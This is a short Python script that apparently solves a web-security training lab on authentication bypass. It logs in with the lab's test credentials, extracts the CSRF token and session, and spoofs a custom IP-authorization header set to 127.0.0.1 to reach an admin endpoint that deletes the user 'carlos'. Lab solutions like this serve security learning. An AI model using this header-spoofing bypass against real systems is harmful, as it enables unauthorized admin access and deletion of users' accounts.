import requests
from colorama import Fore
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Authentication bypass via information disclosure"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    print("[1] Fetching the login page")
    login_page = requests.get(f"{url}/login", allow_redirects=False,
                              verify=False, proxies=proxies)

    print("[2] Getting session and csrf token")
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    print(Fore.GREEN + "csrf_token" + Fore.WHITE +
          " => " + Fore.YELLOW + csrf_token)

    print("[3] Logging in as wiener")
    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    cookies = {"session": session}
    login_as_wiener = requests.post(f"{url}/login", data=data, cookies=cookies, allow_redirects=False,
                                    verify=False, proxies=proxies)

    print("[4] Getting a new session as wiener")
    new_session = login_as_wiener.cookies.get("session")

    print("[5] Deleting carlos from the admin panel bypassing access using a custom header")
    cookies = {"session": new_session}
    headers = {"X-Custom-Ip-Authorization": "127.0.0.1"}

    print("[+] Refresh the page if needed")

    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies,
                 headers=headers, allow_redirects=False, verify=False, proxies=proxies)
    return True
